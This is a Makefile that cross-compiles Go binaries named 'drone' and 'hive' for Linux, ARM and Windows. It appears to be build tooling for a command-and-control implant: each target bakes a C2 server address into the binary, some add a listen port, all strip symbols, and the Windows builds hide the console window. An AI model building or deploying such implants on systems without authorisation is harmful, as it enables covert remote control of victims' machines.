BUILD=go build
OUT_LINUX_DRONE=drone
OUT_WINDOWS_DRONE=drone.exe
OUT_HIVE=hive
LINUX_SSH_LDFLAGS=--ldflags "-X main.c2Server=${C2HOST} -X main.listenPort=${LPORT} -X main.fileName=drone -s -w"
LINUX_LDFLAGS=--ldflags "-X main.c2Server=${C2HOST} -s -w"
WIN_SSH_LDFLAGS=--ldflags "-X main.c2Server=${C2HOST} -X main.listenPort=${LPORT} -X main.fileName=drone.exe -s -w -H=windowsgui"
WIN_LDFLAGS=--ldflags "-X main.c2Server=${C2HOST} -s -w -H=windowsgui"
HIVE_SSH_LDFLAGS=--ldflags "-X main.c2Server=${C2HOST} -X main.listenPort=${LPORT} -X main.fileName=${FILENAME} -s -w"
HIVE_LDFLAGS=--ldflags "-X main.c2Server=${C2HOST} -s -w"
linuxDrone32:
	env GOOS=linux GOARCH=386 ${BUILD} ${LINUX_LDFLAGS} -o ${OUT_LINUX_DRONE} ${LISTENER}

linuxDrone64:
	env GOOS=linux GOARCH=amd64 ${BUILD} ${LINUX_LDFLAGS} -o ${OUT_LINUX_DRONE} ${LISTENER}

linuxDroneSSH32:
	env GOOS=linux GOARCH=386 ${BUILD} ${LINUX_SSH_LDFLAGS} -o ${OUT_LINUX_DRONE} ${LISTENER}

linuxDroneSSH64:
	env GOOS=linux GOARCH=amd64 ${BUILD} ${LINUX_SSH_LDFLAGS} -o ${OUT_LINUX_DRONE} ${LISTENER}

windowsDrone32:
	env GOOS=windows GOARCH=386 ${BUILD} ${WIN_LDFLAGS} -o ${OUT_WINDOWS_DRONE} ${LISTENER}

windowsDrone64:
	env GOOS=windows GOARCH=amd64 ${BUILD} ${WIN_LDFLAGS} -o ${OUT_WINDOWS_DRONE} ${LISTENER}

windowsDroneSSH32:
	env GOOS=windows GOARCH=386 ${BUILD} ${WIN_SSH_LDFLAGS} -o ${OUT_WINDOWS_DRONE} ${LISTENER}

windowsDroneSSH64:
	env GOOS=windows GOARCH=amd64 ${BUILD} ${WIN_SSH_LDFLAGS} -o ${OUT_WINDOWS_DRONE} ${LISTENER}

hive:
	env GOOS=linux GOARCH=arm ${BUILD} ${HIVE_LDFLAGS} -o ${OUT_HIVE} ${LISTENER}

hiveSSH:
	env GOOS=linux GOARCH=arm ${BUILD} ${HIVE_SSH_LDFLAGS} -o ${OUT_HIVE} ${LISTENER}
